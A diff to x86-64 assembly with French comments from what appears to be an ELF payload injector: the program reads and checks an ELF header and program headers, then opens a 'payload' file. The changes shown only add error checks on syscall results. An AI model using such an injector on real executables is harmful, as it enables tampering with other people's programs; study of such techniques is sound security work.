@@ -58,6 +58,12 @@ _start:
     mov rdx, 0
     syscall
 
+	cmp rax, 0
+	jl erreur
+
+	cmp rax, 2
+	jbe erreur
+
 	mov r8, rax			; Sauvegarder le fd
 
 	mov rax, 0
@@ -65,6 +71,9 @@ _start:
 	mov rsi, elfheader
 	mov rdx, 64
 	syscall				; Lire l'ELF Header
+
+	cmp rax, 64
+	jne erreur
 
 	mov eax, [elfheader]
 	cmp eax, [vmagicnum]
@@ -87,6 +96,9 @@ _start:
 	mov rsi, elfdata
 	mov rdx, 4096
 	syscall				; Lire les Program Headers
+
+	cmp rax, 0
+	jl erreur
 
 	mov rcx, 0			; i = 0
 
@@ -189,10 +201,13 @@ fin_recherche:
 	mov rdx, 0
 	syscall		; Ouvre le payload
 
-	mov r14, rax
-
-	cmp r14, 0
+	cmp rax, 0
 	jl erreur
+
+	cmp rax, 2
+	jbe erreur
+
+	mov r14, rax
 
 	mov rax, 0
 	mov rdi, r14
